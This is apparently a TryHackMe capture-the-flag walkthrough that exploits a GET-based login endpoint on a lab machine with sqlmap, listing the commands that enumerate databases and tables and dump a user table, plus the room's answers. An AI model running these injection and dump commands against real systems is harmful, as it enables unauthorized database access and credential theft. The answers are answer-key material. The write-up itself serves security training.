# TryHackMe CTF Walkthrough: SQL Injection via SQLMap

This walkthrough details the steps taken to identify and exploit a SQL Injection vulnerability in a web application's login form using SQLMap.

## Step 1: Identifying the Vulnerable Request
The first step in testing for SQL injection is understanding how the web application communicates with the backend server. 

By navigating to the login page (`http://10.113.128.121/ai/login`) and submitting test credentials (e.g., `admin` / `admin`), we can inspect the traffic using the browser's Developer Tools (specifically the Network tab).

The inspection reveals that the login form does not use a standard `POST` request. Instead, it sends a `GET` request to a backend endpoint, passing the credentials directly in the URL parameters:
```http
GET http://10.113.128.121/ai/includes/user_login?email=admin&password=admin HTTP/1.1
```
Because the `email` and `password` parameters are passed via the URL, we can use HTTP GET-based testing in SQLMap.

---

## Step 2: Database Enumeration
Now that we have our vulnerable endpoint and parameters, we can use SQLMap to enumerate the backend databases. We use the `-u` flag to specify the URL and the `--dbs` flag to list all available databases. The `--level=5` flag is added to perform a deeper, more exhaustive test of all parameters and headers.

**Command:**
```bash
sqlmap -u "http://10.113.128.121/ai/includes/user_login?email=admin&password=admin" --dbs --level=5
```

**Results:**
SQLMap successfully exploited a Time-based Blind vulnerability on the `email` parameter. It retrieved **6 databases**:
*   `ai`
*   `information_schema`
*   `mysql`
*   `performance_schema`
*   `phpmyadmin`
*   `test`

**CTF Question Answered:** 
*   *How many databases are available in this web application?* **6**

---

## Step 3: Table Enumeration
With the database names revealed, the `ai` database looks like the most relevant target for user data. We can now extract the tables contained within it by specifying the database with `-D ai` and using the `--tables` flag.

**Command:**
```bash
sqlmap -u "http://10.113.128.121/ai/includes/user_login?email=admin&password=admin" -D ai --tables --level=5
```

**Results:**
SQLMap fetched the table structure for the `ai` database and found **1 table**:
*   `user`

**CTF Question Answered:** 
*   *What is the name of the table available in the "ai" database?* **user**

---

## Step 4: Data Extraction (Dumping Records)
Finally, we want to extract the actual records stored inside the `user` table. We use the `--dump` flag, specifying both the database (`-D ai`) and the target table (`-T user`).

**Command:**
```bash
sqlmap -u "http://10.113.128.121/ai/includes/user_login?email=admin&password=admin" -D ai -T user --dump --level=5
```

**Results:**
SQLMap successfully dumped the contents of the `user` table. The output reveals a single entry with the following details:

| id | email | created | password |
| :--- | :--- | :--- | :--- |
| 1 | test@chatai.com | 2023-02-21 09:05:46 | 12345678 |

**CTF Question Answered:** 
*   *What is the password of the email test@chatai.com?* **12345678**
